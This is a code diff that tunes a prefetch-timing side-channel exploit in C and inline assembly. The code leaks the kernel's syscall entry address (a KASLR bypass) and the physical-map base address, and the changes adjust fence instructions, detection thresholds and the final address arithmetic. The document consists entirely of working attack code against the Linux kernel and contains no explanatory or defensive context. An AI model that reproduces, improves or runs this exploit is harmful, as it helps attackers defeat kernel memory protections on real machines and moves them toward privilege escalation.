@@ -8,16 +8,15 @@ uint64_t sidechannel(uint64_t addr) {
     "mov %0, rax;"
     "mov %1, rdx;"
     "xor rax, rax;"
-    "lfence;"
+    "mfence;"
     "prefetcht0 qword ptr [%4];"
     "prefetcht0 qword ptr [%4];"
     "xor rax, rax;"
-    "lfence;"
+    "mfence;"
     "rdtscp;"
     "mov %2, rax;"
     "mov %3, rdx;"
     "mfence;"
-    
     ".att_syntax;"
     : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
     : "r" (addr)
@@ -87,7 +86,7 @@ uint64_t leak_syscall_entry(int pti,int boost)
                 continue;
             }
             // Find the `dent`
-            if( data[i]< previous_data && previous_data-data[i] > 0.15*previous_data && (data[i]-min)<min*1.05 )
+            if( data[i]< previous_data && previous_data-data[i] > 0.15*previous_data && data[i]<min*1.05)
             {
                 addr = SCAN_START + i * STEP;
                 break;
@@ -108,8 +107,6 @@ size_t leakKASLR(int pti, size_t offset, int boost){
 }
 
 
-
-
 uint64_t leak_phys(void) 
 {
     uint64_t data[ARR_SIZE_PHYS] = {0};
@@ -118,26 +115,59 @@ uint64_t leak_phys(void)
     {
         for (uint64_t idx = 0; idx < ARR_SIZE_PHYS; idx++) 
         {
+
             uint64_t test = SCAN_START_PHYS + idx * STEP_PHYS;
-            syscall(104);
+            syscall(104); 
+
             uint64_t time = sidechannel(test);
             if (i >= DUMMY_ITERATIONS)
                 data[idx] += time;
         }
     }
-    for (int i = 0; i < ARR_SIZE_PHYS; i++)
+    size_t idxxx = -1;
+    for (int i = 0x40; i < ARR_SIZE_PHYS; i++)
     {
         data[i] /= ITERATIONS;
         if (data[i] < min)
         {
             min = data[i];
             addr = SCAN_START_PHYS + i * STEP_PHYS;
+            idxxx = i;
+            // printf("%p %p pre: %p\n",addr,min,data[i-1]);
         }
     }
+
+    int previous_data = data[0x40];
+
+    
+        // More analysis for pti
+        for(int i = 0x41; i< ARR_SIZE_PHYS; i++)
+        {
+            if(data[i]>previous_data*1.1)
+            {
+                //outliner
+                continue;
+            }
+            // Find the `dent`
+            // printf("[X] MIN: %p\n",min);
+            // if(idxxx==i){
+            //     printf("%d %d %d",data[i]< previous_data,(double)previous_data*0.95 > (double)data[i],data[i] < min*1.0625);
+            // }
+            if( data[i]< previous_data && \
+                (double)previous_data*0.9375 > (double)data[i] && \
+                data[i] < min*1.0625 )
+            {
+                // printf("[X] pre: %p cur: %p min: %p\n",previous_data,data[i],min);
+                addr = SCAN_START_PHYS + i * STEP_PHYS;
+                break;
+            }
+            previous_data = data[i];
+        }
+    
     return addr;
 }
 size_t leakPHYS(size_t offset){
-    size_t val =  leak_phys() - 0x100000000+offset;
+    size_t val =  leak_phys()-0x100000000;
     printf ("PHAMAP base %llx\n",val);
     return val;
 }
